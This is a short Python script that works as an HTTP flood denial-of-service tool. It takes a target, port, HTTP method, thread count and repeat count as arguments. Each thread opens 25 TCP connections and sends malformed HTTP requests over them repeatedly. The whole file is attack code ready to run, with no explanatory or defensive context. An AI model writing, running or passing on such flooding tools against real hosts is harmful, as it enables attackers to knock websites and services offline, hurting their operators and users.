import socket,random,threading,sys,string

def generate_string(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

mode = 0

def http_packet(ip,port,methods,time):
    global mode
    list_socket = []
    for _ in range(25):
     try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        s.connect_ex((ip,port))
        list_socket.append(s)
     except:pass
    while True:
     if mode == 1:
      print('flooding . . .')
      for s in list_socket:
       packet = f'{methods} /{generate_string(1)} HTTP/1.1\nHost: {ip}\n\n\r\r'.encode()
       try:
          for _ in range(time):
            s.send(packet)
            s.sendall(packet)
       except:list_socket.remove(s)
      break

threads = 0
if len(sys.argv) == 6:
 target = str(sys.argv[1])
 port = int(sys.argv[2])
 methods = str(sys.argv[3])
 threads = int(sys.argv[4])
 time = int(sys.argv[5])
else:print(f'{sys.argv[0]} <TARGET> <PORT> <METHODS_HTTP> <THREAD> <TIME>')

for a in range(threads):
  threading.Thread(target=http_packet,args=(target,port,methods,time)).start()
mode = 1